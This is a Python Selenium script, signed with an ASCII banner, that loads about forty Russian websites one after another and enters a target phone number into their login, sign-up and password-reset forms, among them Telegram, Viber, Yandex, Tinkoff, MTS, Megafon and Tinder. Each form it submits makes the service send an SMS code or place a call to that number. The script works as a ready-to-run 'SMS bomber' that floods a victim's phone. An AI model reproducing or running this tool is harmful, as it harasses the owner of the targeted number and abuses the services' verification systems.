from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from auth_data import num_tel, username
from termcolor import colored
import time
import random

print(colored( '''

     █▀▀█ █▀▀█ █   █ █▀▀ █
     █  █ █▄▄█  █ █  █▀▀ █
     ▀▀▀▀ ▀  ▀   ▀   ▀▀▀ ▀▀▀

	   create by Shaparac
''','cyan'))


def login(num_tel, username):
    s = Service("../chromedriver/chromedriver")
    browser = webdriver.Chrome(service=s)

    try:  # work
        browser.get('https://www.eapteka.ru/personal/order/make/')
        time.sleep(random.randrange(3, 5))
        browser.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/div/div/div/div/div/form/div[2]/label/span').click()
        time.sleep(2)
        browser.find_element(By.NAME, 'phone').click()
        time.sleep(2)
        browser.find_element(By.NAME, 'phone').send_keys(num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+] www.eapteka.ru")
    except:
        print("[-] www.eapteka.ru")
    time.sleep(2)

    try:   # work
        browser.get('https://www.dns-shop.ru/')
        time.sleep(random.randrange(3, 5))
        browser.find_element(By.XPATH, '/html/body/header/nav/div/div[1]/div[4]/button').click()
        time.sleep(1)
        browser.find_element(By.XPATH, '/html/body/header/div[2]/div[2]/div/div/div/div[2]/div/input').click()
        browser.find_element(By.XPATH, '/html/body/header/div[2]/div[2]/div/div/div/div[2]/div/input').send_keys(num_tel, Keys.ENTER)
        print("[+] www.dns-shop.ru")
    except:
        print("[-] www.dns-shop.ru")
    time.sleep(2)

    try:  # work
        browser.get('https://www.delivery-club.ru/moscow')
        time.sleep(random.randrange(3, 5))
        browser.find_element(By.XPATH, '/html/body/div[1]/div[1]/header/div[1]/div[4]/button').click()
        browser.find_element(By.CLASS_NAME, 'label--def').send_keys(num_tel)
        time.sleep(random.randrange(5, 7))
        print("[+] www.delivery-club.ru")
    except:
        print("[-] www.delivery-club.ru")
    time.sleep(2)

    try:  # work
        browser.get('https://sbermarket.ru/')
        time.sleep(random.randrange(3, 5))
        browser.find_element(By.XPATH, '/html/body/div[1]/div[3]/div/header/div/div[6]/button').click()
        time.sleep(1)
        browser.find_element(By.XPATH, '/html/body/div[1]/div[4]/div/div[2]/div/div/div/form/div[1]').click()
        time.sleep(1)
        browser.find_element(By.XPATH, '/html/body/div[1]/div[4]/div/div[2]/div/div/div/form/div[1]/input').send_keys(num_tel, Keys.ENTER)
        time.sleep(1)
        print("[+] sbermarket.ru")
    except:
        print("[-] sbermarket.ru")

    try:  # work
        browser.get('https://web.telegram.org/z/')
        time.sleep(random.randrange(3, 5))
        browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/button[1]').click()
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/form/div[2]/input').click()
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/form/div[2]/input').send_keys(num_tel)
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/form/button[1]/div').click()
        time.sleep(2)
        print("[+] web.telegram.org")
    except:
        print("[-] web.telegram.org")

    try:  # work
        browser.get('https://account.viber.com/ru/create-account')
        browser.find_element(By.XPATH, '/html/body/div[1]/div/div[2]/section/div/div/div/div/form/div/div[1]/div[2]/div/input[2]').click()
        browser.find_element(By.XPATH, '/html/body/div[1]/div/div[2]/section/div/div/div/div/form/div/div[1]/div[2]/div/input[2]').send_keys(num_tel, Keys.ENTER)
        time.sleep(1)
        print("[+] viber.com")
    except:
        print("[-] viber.com")

    try:  # work
        browser.get('https://auth.auto.ru/login/?r=https%3A%2F%2Fauto.ru%2F&_ga=2.17865850.2141905612.'
                    '1644775735-1335248302.1644775735')
        browser.find_element(By.XPATH, '/html/body/div[2]/div/div/div/form/div/div[2]/span/label/div/span/input').click()
        browser.find_element(By.XPATH, '/html/body/div[2]/div/div/div/form/div/div[2]/span/label/div/span/input').send_keys(num_tel, Keys.ENTER)
        time.sleep(1)
        print("[+] auto.ru")
    except:
        print("[-] auto.ru")

    try:  # work
        browser.get('https://www.avito.ru/#registration?authsrc=h')
        browser.find_element(By.NAME, 'username').send_keys(num_tel, Keys.ENTER)
        time.sleep(1)
        print("[+] www.avito.ru")
    except:
        print("[-] www.avito.ru")

    try:  # work
        browser.get('https://passport.yandex.ru/auth/restore/login?retpath=https%3A%2F%2Ftaxi.yandex.ru%2Fru_ru%2F&from=taxi')
        browser.find_element(By.NAME, 'phone').send_keys(num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+] yandex.taxi")
    except:
        print("[-] yandex.taxi")

    try:  # work
        browser.get('https://www.ivi.ru/profile')
        browser.find_element(By.XPATH, '/html/body/div[3]/div/div/div/div/button').click()
        time.sleep(1)
        browser.find_element(By.NAME, 'login').send_keys('7'+num_tel, Keys.ENTER)
        time.sleep(3)
        print("[+] www.ivi.ru")
    except:
        print("[-] www.ivi.ru")

    try:  # work
        browser.get('https://okko.tv/')
        time.sleep(1)
        browser.find_element(By.XPATH, '/html/body/div[1]/div[2]/div[1]/div[1]/header[1]/nav/div/a[2]').click()
        time.sleep(1)
        browser.find_element(By.XPATH, '/html/body/div[1]/div[2]/div[2]/div/div/div[2]/div/div/div[1]/div[1]/div/button/span').click()
        browser.find_element(By.XPATH, '/html/body/div[1]/div[2]/div[2]/div/div/div[2]/div/div/div[1]/div[1]/form/div[1]/input').send_keys('7'+num_tel, Keys.ENTER)
        time.sleep(4)
        print("[+] okko.tv")
    except:
        print("[-] okko.tv")

    try:  # work
        browser.get('https://ohana-fitness.ru/')
        browser.find_element(By.XPATH, '/html/body/div[1]/header/div/div/div[3]/div/a').click()
        browser.find_element(By.NAME, 'firstname').click()
        browser.find_element(By.NAME, 'firstname').send_keys(username, Keys.TAB)
        browser.find_element(By.NAME, 'phone').send_keys(num_tel, Keys.ENTER)
        time.sleep(1)
        print("[+] ohana-fitness.ru")
    except:
        print("[-] ohana-fitness.ru")

    try:  # work
        browser.get('https://premier.one/')
        browser.find_element(By.XPATH, '/html/body/div[1]/section/div[1]/header/div/div[2]/div/div/div/span').click()
        time.sleep(1)
        browser.find_element(By.NAME, 'phone').send_keys(num_tel, Keys.ENTER)
        time.sleep(1)
        print("[+] premier.one")
    except:
        print("[-] premier.one")

    try:  # no work
        browser.get('https://www.ozon.ru/gocheckout/login?hideEmail=1')
        time.sleep(7)
        browser.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/div[3]/div/label/div/div/input').send_keys(num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+]www.ozon.ru")
    except:
        print("[-]www.ozon.ru")

    try:  #  no work
        browser.get('https://www.wildberries.ru/security/login?returnUrl=https%3A%2F%2Fwww.wildberries.ru%2F')
        time.sleep(2)
        browser.find_element(By.CLASS_NAME, 'input-item').send_keys(num_tel)
        browser.find_element(By.CLASS_NAME, 'checkbox-with-text__decor').click()
        browser.find_element(By.XPATH, '/html/body/div[1]/main/div[2]/div/div/div/form/div[1]/div[7]/label/span[1]').click()
        browser.find_element(By.XPATH, '/html/body/div[1]/main/div[2]/div/div/div/form/div[1]/button').click()
        time.sleep(2)
        print("[+] www.wildberries.ru")
    except:
        print("[-] www.wildberries.ru")

    try:  # work
        browser.get('https://www.winelab.ru/login')
        time.sleep(1)
        browser.find_element(By.ID, 'age-confirm-modal-btn').click()
        time.sleep(2)
        browser.find_element(By.CLASS_NAME, 'js-password-forgotten').click()
        time.sleep(2)
        browser.find_element(By.NAME, 'mobileNumber').click()
        time.sleep(2)
        browser.find_element(By.NAME, 'mobileNumber').send_keys(num_tel, Keys.ENTER)    # с номером траблы
        print("[+] www.winelab.ru")
    except:
        print("[-] www.winelab.ru")

    try:  # work
        browser.get('https://tinder.com/ru')
        time.sleep(3)
        browser.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/main/div[1]/div/div/div/div/header/div/div[2]/div[2]/a').click()
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[2]/div/div/div[1]/div/div[3]/span/button').click()
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[2]/div/div/div[1]/div/div[3]/span/div[3]/button/span[2]').click()
        time.sleep(5)
        browser.find_element(By.NAME, 'phone_number').send_keys(num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+] tinder.com")
    except:
        print("[-] tinder.com")

    try:  # work
        browser.get('https://id.x5.ru/tck?redirect_url=https://karusel.ru/auth/')
        time.sleep(2)
        browser.find_element(By.NAME, 'phone').send_keys(num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+] karusel.ru")
    except:
        print("[-] karusel.ru")

    try:  # work
        browser.get('https://www.tinkoff.ru/')
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[1]/div/header/div/div/div/div/div[1]/div[3]/a/span[1]').click()
        time.sleep(2)
        browser.find_element(By.NAME, 'phone').send_keys(num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+] www.tinkoff.ru")
    except:
        print("[-] www.tinkoff.ru")

    try:  # work
        browser.get('https://login.mts.ru/amserver/UI/Login?client_id=mts.ru&goto=https%3A%2F%2Flogin.mts.ru%2Famserver%2Foauth2%2Fauthorize%3Fscope%3Dprofile%2520account%2520phone%2520slaves%253Aall%2520slaves%253Aprofile%2520sub%2520email%2520user_address%2520identity_doc%26response_type%3Dcode%26client_id%3Dmts.ru%26state%3D86cee5e962cc4e5ca0b832d6c599e2f6%26redirect_uri%3Dhttps%253A%252F%252Fauth-web.ssl.mts.ru%252Faccount%252Fcallback%252Flogin&realm=%2Fusers')
        time.sleep(2)
        browser.find_element(By.NAME, 'login').send_keys(num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+] login.mts.ru")
    except:
        print("[-] login.mts.ru")

    try:  # work
        browser.get('https://www.rabota.ru/?auth=sign-in')
        time.sleep(2)
        browser.find_element(By.NAME, 'login').send_keys(num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+] www.rabota.ru")
    except:
        print("[-] www.rabota.ru")

    try:  # work
        browser.get('https://sso.sbis.ru/auth-online/?ret=online.sbis.ru/&tab=register&regType=personal')
        time.sleep(2)
        browser.find_element(By.NAME, 'input').send_keys(num_tel, Keys.ENTER)
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div[1]/div[2]/div/div/div[2]/div/span[1]/span').click()
        time.sleep(2)
        print("[+] sbis.ru")
    except:
        print("[-] sbis.ru")

    try:  # work
        browser.get('https://findclone.ru/')
        time.sleep(1)
        browser.find_element(By.XPATH, '/html/body/div/div[1]/div/div/form[1]/ul/li[4]/a[2]').click()
        time.sleep(1)
        browser.find_element(By.XPATH, '/html/body/div/div[1]/div/div/form[2]/ul/li[1]/div/input').click()
        time.sleep(1)
        browser.find_element(By.XPATH, '/html/body/div/div[1]/div/div/form[2]/ul/li[1]/div/input').send_keys(num_tel, Keys.ENTER)
        time.sleep(1)
        print("[+] findclone.ru")
    except:
        print("[-] findclone.ru")

    try:  # work
        browser.get('https://web.icq.com/')
        time.sleep(1)
        browser.find_element(By.ID, 'im-webim-gen-2').click()
        time.sleep(1)
        browser.find_element(By.ID, 'im-webim-gen-4').send_keys(num_tel, Keys.ENTER)
        time.sleep(1)
        print("[+] web.icq.com")
    except:
        print("[-] web.icq.com")

    try:  #  no work
        browser.get('https://lenta.com/npl/authentication/')
        time.sleep(7)
        browser.find_element(By.NAME, 'phone').click()
        time.sleep(2)
        browser.find_element(By.NAME, 'phone').send_keys(num_tel)
        time.sleep(2)
        browser.find_element(By.CLASS_NAME, 'button registration__button').click()
        time.sleep(2)
        print("[+] lenta.com")
    except:
        print("[-] lenta.com")

    try:  # work
        browser.get('https://ok.ru/dk?st.cmd=anonymRegistrationEnterPhone')
        time.sleep(2)
        browser.find_element(By.NAME, 'st.r.phone').send_keys(num_tel, Keys.ENTER)
        time.sleep(3)
        print("[+] ok.ru")
    except:
        print("[-] ok.ru")

    try:  # work
        browser.get('https://qlean.ru/sso?clientId=7c7215b6-590c-43d2-8ff3-949add0db9b0&redirectUrl=https%3A%2F%2Fqlean.ru%2F')
        time.sleep(1)
        browser.find_element(By.NAME, 'phone').send_keys(num_tel, Keys.ENTER)
        time.sleep(1)
        browser.find_element(By.XPATH, '/html/body/div[1]/div[2]/div/div/div[2]/div/div/form/div[7]/button').click()
        time.sleep(2)
        print("[+] qlean.ru")
    except:
        print("[-] qlean.ru")

    try:  # work
        browser.get('https://cabinet.wi-fi.ru/')
        browser.find_element(By.XPATH, '/html/body/section/main/div/div[1]/div/div/div/div/input').click()
        time.sleep(1)
        browser.find_element(By.XPATH, '/html/body/section/main/div/div[1]/div/div/div/div/input').send_keys(num_tel)
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/section/main/div/div[2]/div/button/span').click()
        time.sleep(2)
        print("[+] cabinet.wi-fi.ru")
    except:
        print("[-] cabinet.wi-fi.ru")

    try:  # work
        browser.get('https://wowworks.ru/login/register')
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[1]/div[2]/div[1]/div[2]/div/form/div[1]/input').click()
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[1]/div[2]/div[1]/div[2]/div/form/div[1]/input').send_keys('7'+num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+] wowworks.ru")
    except:
        print("[-] wowworks.ru")

    try:  # work
        browser.get('https://new.sportmaster.ru/')
        time.sleep(3)
        browser.find_element(By.XPATH, '/html/body/div[1]/div[1]/div[2]/div/div[3]/button/span').click()
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[1]/div[1]/div/div/div[2]/section/div[3]/span/div/label[2]/input').send_keys(num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+] sportmaster.ru")
    except:
        print("[-] sportmaster.ru")

    try:  # work
        browser.get('https://lk.megafon.ru/api/login/')
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[3]/div[1]/div/div/div/div[2]/div[2]/div/span[2]').click()
        time.sleep(2)
        browser.find_element(By.NAME, 'login').send_keys(num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+] megafon.ru")
    except:
        print("[-] megafon.ru")

    try:  # work
        browser.get('https://moskva.beeline.ru/customers/products/')
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[1]/div[1]/div/div/header/div[1]/div[1]/div[1]/div[1]/div/div[2]/div[3]/div/div/div/button/span').click()
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[7]/div/div/div[2]/div/div[2]/div/ul/li[2]/button/div/span').click()
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[7]/div/div/div[2]/div/div[3]/div/form/div[1]/label/input').send_keys(num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+] beeline.ru")
    except:
        print("[-] beeline.ru")

    try:  # work
        browser.get('https://hh.ru/account/login?backurl=%2F')
        time.sleep(2)
        browser.find_element(By.NAME, 'login').send_keys(num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+] hh.ru")
    except:
        print("[-] hh.ru")

    try:  # work
        browser.get('https://www.zarplata.ru/auth/recover-password')
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[2]/div/div[3]/div/div/div/div/div[1]/div/div/input').send_keys('7'+num_tel)
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[2]/div/div[3]/div/div/div/div/button').send_keys(Keys.ENTER)
        time.sleep(2)
        print("[+] zarplata.ru")
    except:
        print("[-] zarplata.ru")

    try:  # work
        browser.get('https://yakitoriya.ru/')
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[1]/header/div/div[2]/div[2]/a').click()
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[4]/div/div/div/div/div/ul/li/div/fieldset/div/div[1]/form/input[2]').click()
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[4]/div/div/div/div/div/ul/li/div/fieldset/div/div[1]/form/input[2]').send_keys('7'+num_tel, Keys.ENTER)
        time.sleep(2)
        print("[+] yakitoriya.ru")
    except:
        print("[-] yakitoriya.ru")

    try:  # work
        browser.get('https://tanukifamily.ru/')
        time.sleep(3)
        browser.find_element(By.XPATH, '/html/body/div[1]/header/div/div/div/div[3]/div/button').click()
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[1]/header/div/div/div/div[3]/div/div/form/div[2]/div/div/input').click()
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[1]/header/div/div/div/div[3]/div/div/form/div[2]/div/div/input').send_keys('7'+num_tel, Keys.ENTER)
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[1]/header/div/div/div/div[3]/div/div/form/div[2]/div/button').click()
        time.sleep(2)
        print("[+] tanukifamily.ru")
    except:
        print("[-] tanukifamily.ru")

    try:  # work
        browser.get('https://www.niyama.ru/auth/')
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[2]/main/div/div/div/form/div/div[1]/div[1]/div[1]/input').click()
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[2]/main/div/div/div/form/div/div[1]/div[1]/div[1]/input').send_keys(num_tel)
        time.sleep(2)
        browser.find_element(By.XPATH, '/html/body/div[2]/main/div/div/div/form/div/div[1]/div[1]/input').click()
        time.sleep(2)
        print("[+] niyama.ru")
    except:
        print("[-] niyama.ru")


login(num_tel, username)
